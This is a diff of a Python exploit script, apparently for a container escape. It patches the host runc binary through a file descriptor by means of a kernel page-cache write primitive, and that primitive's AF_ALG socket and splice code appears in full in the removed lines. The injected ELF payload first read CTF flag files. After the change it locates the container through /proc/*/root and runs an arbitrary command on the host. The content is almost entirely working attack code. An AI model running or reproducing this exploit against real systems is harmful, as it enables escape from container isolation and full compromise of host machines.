@@ -1,10 +1,10 @@
 #!/usr/bin/env python3
 import os
-import socket
+import shlex
 import struct
 import sys
 
-LEVEL = 279
+from copyfail_primitive import copy_fail_fd
 
 
 def elf_payload(cmd: str) -> bytes:
@@ -46,44 +46,45 @@ def elf_payload(cmd: str) -> bytes:
     struct.pack_into("<IIQQQQQQ", ph, 0, 1, 5, 0, 0x400000, 0x400000, size, size, 0x1000)
     return bytes(eh + ph + code)
 
-
-def write4(fd, offset, chunk):
-    a = socket.socket(38, 5, 0)
-    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
-    a.setsockopt(LEVEL, 1, bytes.fromhex("0800010000000010" + "0" * 64))
-    a.setsockopt(LEVEL, 5, None, 4)
-    u, _ = a.accept()
-    z = b"\0"
-    o = offset + 4
-    u.sendmsg([b"A" * 4 + chunk], [(LEVEL, 3, z * 4), (LEVEL, 2, b"\x10" + z * 19), (LEVEL, 4, b"\x08" + z * 3)], 32768)
-    r, w = os.pipe()
-    os.splice(fd, w, o, offset_src=0)
-    os.splice(r, u.fileno(), o)
-    try:
-        u.recv(8 + offset)
-    except Exception:
-        pass
-    for x in (r, w, u.fileno(), a.fileno()):
-        try:
-            os.close(x)
-        except OSError:
-            pass
-
-
-def copy_fail_fd(fd, data):
-    for i in range(0, len(data), 4):
-        write4(fd, i, data[i : i + 4].ljust(4, b"\0"))
-
+if len(sys.argv) < 5:
+    raise SystemExit(f"usage: {sys.argv[0]} RUNC_FD CONTAINER_OUT MARKER_PATH MARKER_TOKEN [host-command [args...]]")
 
 out = sys.argv[2]
+marker = sys.argv[3]
+token = sys.argv[4]
+argv = sys.argv[5:]
+if argv:
+    host_command = shlex.join(argv)
+else:
+    host_command = "hostname"
+
+qout = shlex.quote(out)
+qmarker = shlex.quote(marker)
+qtoken = shlex.quote(token)
 cmd = (
-    f"for f in /flag /flag.txt /root/flag /root/flag.txt /home/*/flag*; do "
-    f"[ -r \"$f\" ] && {{ cat \"$f\" > {out}; chmod 644 {out}; exit; }}; done; "
-    f"id > {out}.err 2>&1"
+    f"c_out={qout}; "
+    f"c_marker={qmarker}; "
+    f"c_token={qtoken}; "
+    f"out=; "
+    f"for r in /proc/[0-9]*/root; do "
+    f"if [ -r \"$r$c_marker\" ] && [ \"$(cat \"$r$c_marker\" 2>/dev/null)\" = \"$c_token\" ]; then "
+    f"out=\"$r$c_out\"; break; "
+    f"fi; "
+    f"done; "
+    f"[ -n \"$out\" ] || exit 111; "
+    f"rm -f \"$out\" \"$out.done\"; "
+    f"( {host_command} ) > \"$out\" 2>&1; "
+    f"rc=$?; "
+    f"printf '\\n[exit=%d]\\n' \"$rc\" >> \"$out\"; "
+    f"chmod 644 \"$out\"; "
+    f"printf '%s\\n' \"$rc\" > \"$out.done\"; "
+    f"chmod 644 \"$out.done\""
 )
 payload = elf_payload(cmd)
+print(f"patching {sys.argv[1]} payload={len(payload)} out=/proc/*/root{out} command={host_command}", flush=True)
 fd = os.open(sys.argv[1], os.O_RDONLY)
-print(f"patching {sys.argv[1]} payload={len(payload)} out={out}", flush=True)
-copy_fail_fd(fd, payload)
-os.close(fd)
+try:
+    copy_fail_fd(fd, payload)
+finally:
+    os.close(fd)
 print("done", flush=True)
